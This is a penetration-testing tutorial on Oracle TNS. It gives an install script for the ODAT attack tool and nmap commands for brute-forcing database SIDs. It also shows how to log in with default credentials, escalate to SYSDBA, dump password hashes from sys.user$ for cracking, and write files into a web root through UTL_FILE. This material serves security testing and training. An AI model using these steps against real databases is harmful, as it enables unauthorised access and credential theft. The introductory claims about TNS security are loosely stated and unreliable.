# Oracle TNS

**Oracle Transparent Network Substrate (TNS)** is a **communication protocol** designed for **secure interaction between Oracle databases and applications** over networks. It supports **various networking protocols**, such as **IPX/SPX and TCP/IP**, making it a **preferred choice for industries like healthcare, finance, and retail**. which work on **port 1521**

🔹 **Key Features:**

✅ **Built-in encryption** for securing transmitted data

✅ **Efficient database communication management**

✅ **Ideal for enterprise environments requiring high security**

**How Does TNS Secure Data?**

TNS **adds an extra security layer** over **TCP/IP**, making it **harder for attackers to intercept or manipulate data** in transit.

***

#### **Installing Oracle Pentesting Tools**

This **Bash script** installs tools for **enumerating and attacking Oracle databases**:

```bash
#!/bin/bash

sudo apt-get install libaio1 python3-dev alien -y
git clone <https://github.com/quentinhardy/odat.git>
cd odat/
git submodule init
git submodule update
wget <https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-basic-linux.x64-21.12.0.0.0dbru.zip>
unzip instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
wget <https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip>
unzip instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
export LD_LIBRARY_PATH=instantclient_21_12:$LD_LIBRARY_PATH
export PATH=$LD_LIBRARY_PATH:$PATH
pip3 install cx_Oracle
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor passlib python-libnmap
sudo apt-get install build-essential libgmp-dev -y
pip3 install pycryptodome
```

✅ **What this script does:**

1️⃣ **Installs required dependencies** (libaio1, python3-dev, alien)

2️⃣ **Clones ODAT tool** from GitHub

3️⃣ **Downloads and sets up Oracle Instant Client**

4️⃣ **Installs cx\_Oracle Python library** for database interaction

5️⃣ **Installs additional penetration testing tools** (scapy, passlib, pycryptodome)

***

**ODAT (Oracle Database Attacking Tool)** is an open-source penetration testing tool designed for:

* **Oracle database enumeration**
* **Exploiting SQL Injection & RCE vulnerabilities**
* **Privilege Escalation**

***

**Oracle Database Penetration Testing with ODAT & Nmap**

**1️⃣ Understanding Oracle TNS and SIDs**

* **TNS (Transparent Network Substrate):** A protocol used for Oracle database communication.
* **SID (System Identifier):** A unique name for a database instance. Clients use it to connect to the correct database.

**2️⃣ Scanning Oracle Services with Nmap**

*   Check if the Oracle **TNS Listener** (default port **1521**) is open:

    ```bash
    sudo nmap -p1521 -sV <target-IP> --open
    ```
*   Bruteforce the **SID** using Nmap’s `oracle-sid-brute` script:

    ```bash
    sudo nmap -p1521 -sV <target-IP> --open --script oracle-sid-brute
    ```

**3️⃣ Installing and Using ODAT for Enumeration**

**Install ODAT on a Kali-based system:**

```bash
sudo apt-get install libaio1 python3-dev alien -y
git clone <https://github.com/quentinhardy/odat.git>
cd odat/
git submodule init && git submodule update
pip3 install cx_Oracle pycryptodome
```

**Run ODAT to enumerate database components:**

```bash
./odat.py all -s <target-IP>
```

This can retrieve **database names, versions, user accounts, and misconfigurations**.

**4️⃣ Cracking Oracle Credentials**

If ODAT finds valid credentials (e.g., `scott/tiger`), log in with **SQL\*Plus**:

```bash
sqlplus scott/tiger@<target-IP>/XE
```

Check user privileges:

```sql
SELECT * FROM user_role_privs;
```

If the user has **SYSDBA** privileges, escalate access:

```bash
sqlplus scott/tiger@<target-IP>/XE as sysdba
```

**5️⃣ Extracting Password Hashes for Offline Cracking**

```sql
SELECT name, password FROM sys.user$;
```

Hashes can be cracked using **John the Ripper** or **Hashcat**.

**6️⃣ Exploiting File Upload via UTL\_FILE**

If UTL\_FILE is enabled, attackers can upload files to the server:

```bash
echo "Oracle File Upload Test" > testing.txt
./odat.py utlfile -s <target-IP> -d XE -U scott -P tiger --sysdba --putFile C:\\\\inetpub\\\\wwwroot testing.txt ./testing.txt
```

Verify the file upload:

```bash
curl -X GET http://<target-IP>/testing.txt
```
